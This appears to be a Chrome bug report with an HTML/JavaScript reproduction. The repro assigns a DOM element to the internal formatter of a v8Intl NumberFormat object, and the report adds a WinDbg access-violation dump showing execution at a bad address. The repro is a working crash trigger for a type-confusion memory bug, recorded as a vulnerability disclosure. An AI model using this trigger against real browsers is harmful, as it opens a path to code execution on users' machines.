Crashes on windows dev 21.0.1145.0 (138079) and canary 21.0.1153.0 (139208).

Repro:
----- crash1.html -----
<script>
    window.onload = main;

    function main(){
        var f1 = window.v8Intl.NumberFormat();
        f1.__formatter__ = window.document.body;
        f1.format();
    }
</script>
<body></body>
-----------------------

(acc.1724): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=59dbab55 ebx=0026ee38 ecx=5b879c54 edx=0026eda8 esi=0026ee54 edi=5b879c54
eip=d75605e8 esp=0026ed90 ebp=0026edb8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
d75605e8 ??              ???

ExceptionAddress: d75605e8
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000008
   Parameter[1]: d75605e8
Attempt to execute non-executable address d75605e8

ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
0026ed8c 5aae7405 0xd75605e8
0026edb8 5ace9fcc chrome_59a10000!icu_46::NumberFormat::format+0x2d
0026ee18 59c7a95d chrome_59a10000!v8_i18n::IntlNumberFormat::JSInternalFormat+0xd0
0026ee80 59c7a75a chrome_59a10000!v8::internal::HandleApiCallHelper<0>+0x1e3
0026ef7c 59c3167d chrome_59a10000!v8::internal::Builtin_HandleApiCall+0x16
0026efc4 59c31538 chrome_59a10000!v8::internal::Invoke+0x139
0026f004 59ca7075 chrome_59a10000!v8::internal::Execution::Call+0x17b
0026f058 59dc47e0 chrome_59a10000!v8::Function::Call+0x117
0026f0a4 59dc458a chrome_59a10000!WebCore::V8Proxy::instrumentedCallFunction+0x1ae
0026f0c8 59dc3d19 chrome_59a10000!WebCore::V8Proxy::callFunction+0x22
0026f0f0 59dc3ab1 chrome_59a10000!WebCore::V8EventListener::callListenerFunction+0x86
0026f130 59dc2bd4 chrome_59a10000!WebCore::V8AbstractEventListener::invokeEventHandler+0x107
0026f170 59dc2a49 chrome_59a10000!WebCore::V8AbstractEventListener::handleEvent+0x76
0026f1a0 59b33eb9 chrome_59a10000!WebCore::EventTarget::fireEventListeners+0x124
0026f1d0 59b8674c chrome_59a10000!WebCore::EventTarget::fireEventListeners+0x73
0026f1f8 59e6faf1 chrome_59a10000!WebCore::DOMWindow::dispatchEvent+0xef
0026f21c 59b704fe chrome_59a10000!WebCore::DOMWindow::dispatchLoadEvent+0x120
0026f240 59b70337 chrome_59a10000!WebCore::Document::implicitClose+0x12f
0026f250 59b6ff4d chrome_59a10000!WebCore::FrameLoader::checkCallImplicitClose+0x4c
0026f268 59b6eaaf chrome_59a10000!WebCore::FrameLoader::checkCompleted+0x150
0026f270 59b6e993 chrome_59a10000!WebCore::FrameLoader::finishedParsing+0x3d
0026f288 59b36f7c chrome_59a10000!WebCore::Document::finishedParsing+0xe8
[...]
